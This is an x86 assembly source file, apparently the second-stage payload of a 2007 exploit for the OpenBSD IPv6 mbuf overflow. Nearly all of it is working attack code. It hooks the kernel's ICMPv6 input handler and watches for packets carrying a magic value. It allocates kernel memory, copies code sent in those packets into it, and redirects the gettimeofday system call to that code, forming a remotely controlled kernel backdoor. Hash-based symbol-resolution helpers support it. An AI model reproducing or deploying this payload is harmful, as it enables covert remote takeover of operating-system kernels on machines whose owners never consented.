 #
 # Stage two shellcode (OpenBSD IPv6 mbuf overflow).
 #
 #  Copyright (c) 2007 Claes M. Nyberg <cmn@signedness.org>
 #  All rights reserved, all wrongs reversed.
 #
 #  Redistribution and use in source and binary forms, with or without
 #  modification, are permitted provided that the following conditions
 #  are met:
 #
 #  1. Redistributions of source code must retain the above copyright
 #     notice, this list of conditions and the following disclaimer.
 #  2. Redistributions in binary form must reproduce the above copyright
 #     notice, this list of conditions and the following disclaimer in the
 #     documentation and/or other materials provided with the distribution.
 #  3. The name of author may not be used to endorse or promote products
 #     derived from this software without specific prior written permission.
 #
 #  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 #  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 #  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 #  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 #  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 #  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 #  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 #  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 #  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 #  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 #
 #

# Hash of symbols to resolve
.set HASH_malloc, 0xe047be43
.set HASH_sysent, 0xedcb2234

# The syscall to wrap
.set SYSCALL_wrap_index, 116 # SYS_gettimeofday

# Resolve syscall address from table
.macro get_syscall idx, reg
    movl   -24(%ebp), %ecx
    movl   \idx, \reg # Index
    movl   4(%ecx, \reg, 8), \reg
.endm

# Set syscall address in table
.macro set_syscall idx, addr
    movl   -24(%ebp), %ecx
    movl   \idx, %eax # Index
    movl   \addr, 4(%ecx, %eax, 8)
.endm


.globl stage2_start
.globl stage2_end
.globl icmp6_magic_bytes

.text
stage2_start:
	# Get our location
	call get_location
	nop
	get_location:

	# Point to start of stage 2 code
	# to extract pointer values
	popl	%ecx
	subl	$5, %ecx

    pushl   %ebp
    movl    %esp, %ebp
	
	# icmp6_input function pointer at -4(%ebp)
	pushl	-0x4(%ecx)

	# icmp6_input pointer to function pointer at -8(%ebp)
	pushl	-0x8(%ecx)

	# Magic bytes that indicates command in packet at -12(%ebp)
	icmp6_magic_bytes:
	pushl	$0x41424344

	# Extract size of data at -16(%ebp)
	movl	8(%ebp), %eax
	movl	(%eax), %eax
	movl	12(%eax), %ecx
	pushl	%ecx

	# Check size (IPv6 + ICMPv6 Header)
	cmpl	$48, %ecx
	jle		call_real_icmp6_input

	# Check for command (magic number)
	movl	8(%eax), %ecx
	addl	$48, %ecx
	movl	(%ecx), %eax
	cmpl	-12(%ebp), %eax
	jne		call_real_icmp6_input

	# Check for uninstall code
	movl	4(%ecx), %eax
	cmpl	$0xffffffff, %eax
	je	uninstall

    # Resolve malloc -20(%ebp)
    pushl   $HASH_malloc
    call	hash_resolve
    movl    %eax, -20(%ebp)

    # Resolve sysent -24(%ebp)
    pushl   $HASH_sysent
    call	hash_resolve
    movl    %eax, -24(%ebp)
	
	# Allocate memory for code
    # that will wrap the syscall
    # malloc(size, M_DEVBUF, M_NOWAIT);
    xorl    %eax, %eax
    incl    %eax
    pushl   %eax                  # flags (M_NOWAIT, 1)
    incl    %eax
    pushl   %eax                  # type (M_DEVBUF, 2) This will add some feature ;)
    movl   -16(%ebp), %eax 
	addl	$24, %eax
	pushl	%eax				  # size
    call    *-20(%ebp)
    test    %eax,%eax
    jz      call_real_icmp6_input # Darn, malloc failed
	
	# %edx - allocated memory
	movl    %eax, %edx

	jmp	get_hash_resolve_addr
	got_hash_resolve_addr:
	popl	%eax
	movl	%eax, (%edx)

    # Store index and address of wrapped
    # syscall for recovery later on
    movl $SYSCALL_wrap_index, 4(%edx)

	movl -24(%ebp), %eax
    get_syscall $SYSCALL_wrap_index, %eax
    movl %eax, 8(%edx)
	
	# Get pointer to data in ICMPv6 
	pushl	%esi
	movl    8(%ebp), %esi
	movl	(%esi), %esi
	movl	8(%esi), %esi
	addl	$52, %esi	# Past headers and magic
	
    # %esi should point to start of code so we copy it
    # into the buffer after the syscall information
    addl    $12, %edx

    # Size of code to copy
    movl    -16(%ebp), %ecx

    # Copy code to allocated buffer
	pushl	%edi
	pushl	%edx
	movl	%edx, %edi

    rep movsb
	popl	%edx
	popl	%edi
	popl	%esi

	# Wrap system call
	set_syscall $SYSCALL_wrap_index, %edx

	# Call real icmp6_input
	call_real_icmp6_input:
		pushl	16(%ebp)	# int proto
		pushl	12(%ebp)	# int *offp
		pushl	8(%ebp)		# struct mbuf **mp
		call	*-0x4(%ebp)	

		finished:
			movl    %ebp, %esp
			popl    %ebp
			ret

	# Uninstall backdoor by replacing the function pointer
	uninstall:
		movl	-8(%ebp), %eax
		movl	-4(%ebp), %edx
		movl	%edx, (%eax)
		jmp	call_real_icmp6_input
	

get_hash_resolve_addr:
	call	got_hash_resolve_addr

# Resolve symbols
.globl hash_resolve
hash_resolve:
	call	get_elfhdr
	pushl	4(%esp)		# hash to resolve
	pushl	%eax		# ELF header address
	call	sym_resolve
	addl	$8, %esp
	ret

#
# 2006-03-16 Joel Eriksson <je@bitnux.com>
#
# Based on code by Christer <christer@signedness.org>
#
# --------------------------------------------------------------------------
#
# Prototype for the sym_resolve() function that is defined:
#
# unsigned long sym_resolve(unsigned long addr, unsigned long hash);
#
# addr: Address to ELF header
# hash: Hash of symbol to resolve
#
# The return value is the address of the symbol.
#
# The ELF header address is normally 0x8048000 for applications.
# The FreeBSD kernels ELF header address is 0xc0400000.
#
# --------------------------------------------------------------------------
#
# This function can be used to calculate the hash value of a symbol string:
#
# unsigned long calc_hash(const char *str)
# {
#     unsigned long hash = 0;
#
#     while (*str)
#         hash = ((hash << 5) | (hash >> 27)) + *str++;
#
#     return hash;
# }
#
# --------------------------------------------------------------------------
#
# The following assumptions are made:
#    There is a dynsym section (sh_type == SHT_DYNSYM)
#    The dynstr section is not the first section (should never happen)
#    That the symbol to resolve exists (unless ERRORCHECK is set)
#

# Uncomment to make sym_resolve() return -1 if the symbol was not found:
#.equ ERRORCHECK, 1

SYMTAB          = 2
Elf32_Shdr_size = 40
Elf32_Sym_size  = 16
e_shoff         = 32
sh_type         = 4
sh_offset       = 16
sh_size         = 20
sh_link         = 24
st_name         = 0
st_value        = 4
arg1_off        = 36
arg2_off        = 40
eax_off         = 28

#.globl sym_resolve

# sym_resolve(ehdr_addr, symb_hash) -> symb_addr
sym_resolve:
        # Save registers
        pusha

        # Calculate section header address
        movl    arg1_off(%esp),%ebx             # ebx = ehdr
        movl    e_shoff(%ebx),%ebp              # ebp = ehdr.e_shoff
        addl    %ebx,%ebp                       # ebp = shdr = ehdr + ehdr.e_shoff
        movl    %ebp,%edi                       # edi = dynsym_shdr = ebp

        # Find the dynsym section
find_dynsym:
        cmpl    $SYMTAB,sh_type(%edi)       
        je      found_dynsym                    #     goto found_dynsym
        addl    $Elf32_Shdr_size,%edi           # edi += sizeof(Elf32_Shdr)
        jmp     find_dynsym

found_dynsym:
        # Get dynstr section (dynstr_shdr = shdr[dynsym_shdr.sh_link])
        movl    %ebp,%esi                       # esi = shdr
        movl    sh_link(%edi),%ecx              # ecx = curr.sh_link

        # Assumes dynstr section is not the first section...
find_dynstr:
        addl    $Elf32_Shdr_size,%esi           # esi += sizeof(Elf32_Shdr)
        loop    find_dynstr

.ifdef ERRORCHECK
        # Save the size of the dynsym section
        movl    sh_size(%edi),%edx              # ecx = dynsym_shdr.sh_size
.endif

        # Calculate dynstr address
        movl    sh_offset(%esi),%esi            # esi = dynstr_shdr.sh_offset
        addl    %ebx,%esi                       # esi = dynstr = ehdr + dynstr_shdr.sh_offset

        # Calculate dynsym address
        movl    sh_offset(%edi),%edi            # edi = dynsym_shdr.sh_offset
        addl    %ebx,%edi                       # edi = dynsym = ehdr + dynsym_shdr.sh_offset

iterate_dynstr:

.ifdef ERRORCHECK
        # Return -1 if no more symbols are left
        xorl    %eax,%eax
        decl    %eax
        subl    $Elf32_Sym_size,%edx
        jbe     return
.endif

        # Initialize hashing
        movl    (%edi),%eax                     # eax = index into dynstr (st_name = offset 0)
        addl    %esi,%eax                       # eax = pointer to string
        xorl    %ebp,%ebp                       # ebp = hash = 0

        # Calculate hash of the symbol string
hash_str:
        movb    (%eax),%cl
        testl   %ecx,%ecx
        je      got_hash
        roll    $5,%ebp
        addl    %ecx,%ebp
        incl    %eax
        jmp     hash_str

got_hash:
        # Compare hash with the hash passed as an argument
        cmpl    arg2_off(%esp),%ebp
        je      hash_match

        # If the hashes did not match, continue the search
        addl    $Elf32_Sym_size,%edi
        jmp     iterate_dynstr

hash_match:
        # If the hashes matched, return the symbol address
        movl    st_value(%edi),%eax

return:
        # Restore registers
        movl    %eax,eax_off(%esp)
        popa

        # Return the symbol address or NULL if no match was found
        ret

# Copyright (C) Joel Eriksson <je@bitsec.se> 2007
# Get the ELF-header mapped after .bss, can be used for symbol resolving
get_elfhdr:
	push %edi   
	push %ecx
	sidt -6(%esp)   
	mov -4(%esp), %edi  
	cld    
	xor %ecx, %ecx  
	dec %ecx   
	mov $0x464c457f, %eax  
	repne scasl   
	lea	-4(%edi), %eax
	pop %ecx
	pop %edi   
	ret

stage2_end:
